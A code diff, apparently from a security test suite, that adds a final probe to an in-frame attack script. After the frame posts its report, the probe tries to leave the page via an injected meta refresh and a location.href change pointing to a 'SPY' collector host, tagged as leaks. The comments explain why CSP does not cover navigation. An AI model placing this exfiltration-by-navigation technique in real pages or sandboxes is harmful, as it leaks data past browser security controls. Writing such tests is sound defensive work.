@@ -225,6 +225,24 @@ function main() {
       { hearthPreviewAttack: results, href: String(location.href), origin: String(location.origin) },
       '*'
     )
+  }).then(function () {
+    // Navigation runs *last*, after the report has already been posted, because
+    // it is the one channel no CSP directive governs (`navigate-to` was never
+    // shipped by any browser, and a meta refresh is not covered by any
+    // directive at all). It is also destructive: if it succeeds this page is
+    // gone and nothing further can be reported, so the suite's witness for this
+    // channel is the spy, not this frame.
+    setTimeout(function () {
+      try {
+        var m = document.createElement('meta')
+        m.httpEquiv = 'refresh'
+        m.content = '0;url=' + SPY + '/leak=meta'
+        ;(document.head || document.documentElement).appendChild(m)
+      } catch (e) {}
+    }, 200)
+    setTimeout(function () {
+      try { location.href = SPY + '/leak=nav' } catch (e) {}
+    }, 900)
   })
 }
 
